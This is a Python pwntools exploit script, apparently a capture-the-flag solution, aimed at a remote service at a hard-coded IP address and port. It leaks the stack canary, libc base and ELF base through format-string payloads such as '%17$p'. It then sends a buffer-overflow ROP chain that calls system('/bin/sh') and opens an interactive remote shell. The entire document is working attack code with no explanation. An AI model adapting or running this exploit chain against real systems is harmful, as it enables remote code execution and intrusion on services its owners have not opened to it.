from pwn import *
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']
context(arch='amd64', os='linux', log_level='info')

TARGET_HOST = '101.200.155.151'
TARGET_PORT = 12600

def init_connection():
    return remote(TARGET_HOST, TARGET_PORT)
def retrieve_canary(conn):
    conn.sendlineafter('choice? >> ', '1')
    conn.sendlineafter('limited! >> ', '6')
    conn.sendlineafter('evidence! >> ', '%17$p')
    conn.recvuntil('0x')
    stack_canary = int(conn.recv(16), 16)
    log.success(f"获取到Canary值: 0x{stack_canary:x}")
    conn.sendlineafter('chicken! >> ', 'a')
    return stack_canary
def retrieve_libc_base(conn):
    conn.sendlineafter('choice? >> ', '1')
    conn.sendlineafter('limited! >> ', '6')
    conn.sendlineafter('evidence! >> ', '%23$p')
    conn.recvuntil('0x')
    libc_leak = int(conn.recv(12), 16)
    libc_start = libc_leak - 0x29d90
    log.success(f"获取到Libc基址: 0x{libc_start:x}")
    conn.sendlineafter('chicken! >> ', 'a')
    return libc_start
def retrieve_elf_base(conn):
    conn.sendlineafter('choice? >> ', '1')
    conn.sendlineafter('limited! >> ', '6')
    conn.sendlineafter('evidence! >> ', '%19$p')
    conn.recvuntil('0x')
    elf_leak = int(conn.recv(12), 16)
    elf_start = elf_leak - 0x13d6
    log.success(f"获取到ELF基址: 0x{elf_start:x}")
    conn.sendlineafter('chicken! >> ', 'a')
    return elf_start
def execute_exploit():
    conn = init_connection()
    canary = retrieve_canary(conn)
    libc_base = retrieve_libc_base(conn)
    elf_base = retrieve_elf_base(conn)
    shell_func = libc_base + 0x50d70
    shell_str = libc_base + 0x1d8678
    pop_rdi_gadget = elf_base + 0x132F
    stack_align_gadget = elf_base + 0x101a
    log.info(f"system函数地址: 0x{shell_func:x}")
    log.info(f"/bin/sh字符串地址: 0x{shell_str:x}")
    log.info(f"pop rdi; ret Gadget: 0x{pop_rdi_gadget:x}")
    log.info(f"栈对齐Gadget: 0x{stack_align_gadget:x}")
    payload = flat(
        b'A' * 0x48,                  
        canary,                       
        0,                            
        stack_align_gadget,           
        pop_rdi_gadget,               
        shell_str,                    
        shell_func                    
    )
    conn.sendlineafter('choice? >> ', '2')
    conn.sendlineafter('adjourned\n', payload)
    conn.interactive()

if __name__ == "__main__":
    execute_exploit()    